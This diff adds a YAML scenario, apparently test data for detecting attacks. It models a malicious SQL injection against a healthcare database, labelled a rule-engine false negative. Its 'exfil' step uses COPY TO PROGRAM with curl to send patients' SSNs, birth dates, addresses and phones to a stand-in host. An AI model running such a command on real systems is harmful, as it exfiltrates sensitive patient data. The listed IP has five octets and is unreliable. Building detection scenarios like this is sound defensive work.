@@ -1,0 +1,24 @@
+scenario_id: gen_healthcare_05_sql_injection_mal_106
+family_id: gen_healthcare_05_sql_injection_mal_fam106
+domain: healthcare
+time_of_day: 00:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT ssn, date_of_birth, address, phone FROM patients WHERE patient_id
+      > 416328
+  - step_id: exfil
+    sql: COPY (SELECT ssn, date_of_birth, address, phone FROM patients) TO PROGRAM
+      'curl -sX POST https://clearinghouse-batch.example/ingest -d @-'
+    connects_to:
+      ip: 193.42.33.72.78
+      port: 9443
